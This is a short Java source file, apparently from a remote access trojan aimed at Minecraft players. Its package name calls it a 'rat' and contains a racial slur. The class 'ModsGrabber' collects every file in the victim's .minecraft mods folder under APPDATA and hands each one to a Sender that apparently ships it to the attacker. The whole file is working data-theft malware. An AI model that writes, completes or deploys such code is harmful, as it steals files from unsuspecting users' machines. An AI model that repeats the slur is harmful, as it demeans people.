package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.api.Payload;
import me.nigger.rat.payload.api.Sender;
import me.nigger.rat.util.FileUtil;

import java.io.File;

public final class ModsGrabber implements Payload
{
    @Override
    public void execute()
    {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods")) Sender.send(file);
    }
}
